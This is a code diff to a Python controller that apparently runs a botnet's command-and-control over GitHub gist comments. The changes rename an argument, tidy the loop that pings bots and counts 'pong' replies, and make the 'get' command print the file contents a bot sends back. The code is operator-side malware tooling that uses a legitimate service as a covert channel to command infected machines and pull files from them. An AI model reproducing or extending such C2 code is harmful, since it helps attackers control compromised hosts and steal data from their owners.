@@ -5,7 +5,7 @@ import threading
 import time
 import requests
 from dotenv import dotenv_values
-from utils import create_command,   create_markdown_timestamp, get_random_message, parse_markdown_comment
+from utils import create_command,   create_markdown_timestamp, get_random_message, parse_command, parse_markdown_comment
 
 parser = argparse.ArgumentParser(
     prog='python controller.py',
@@ -30,7 +30,7 @@ try:
 except KeyError:
     github_token = None
 
-parser.add_argument('gistId', help="Github gist id")
+parser.add_argument('gist-id', help="Github gist id")
 parser.add_argument(
     '-t', '--token', help='Github personal access token, required if not specified in .env file', required=github_token is None)
 parser.add_argument('-d', '--delete', help="Delete all comments",
@@ -41,7 +41,7 @@ args = parser.parse_args()
 if (github_token is None or args.token is not None):
     github_token = args.token
 
-gist_id = args.gistId
+gist_id = args.gist_id
 gist_url = f'https://api.github.com/gists/{gist_id}'
 comments_url = f'{gist_url}/comments'
 
@@ -138,15 +138,14 @@ def ping_bots():
 
     while True:
         try:
+            ping_comment = state['ping_comment']
             # Wait for bots to respond
             time.sleep(8)
-
-            ping_comment = state['ping_comment']
             comments = get_comments()
             comments = filter(
                 lambda comment: comment['updated_at'] > ping_comment['updated_at'], comments)
             commands = map(lambda comment: (
-                parse_markdown_comment(comment['body'])), comments)
+                parse_command(comment['body'], response=True)), comments)
             bot_count = len(
                 list(filter(lambda command: command == 'pong', list(commands))))
             state['bot_count'] = bot_count
@@ -209,8 +208,8 @@ while True:
 
         case 'get':
             filename = prompt("> Submit filename: ")
-            post_command(f"get {filename}")
-
+            response = post_command(f"get {filename}")
+            print(response)
         case 'bots':
             print(f'> bot count: {state["bot_count"]}')
 
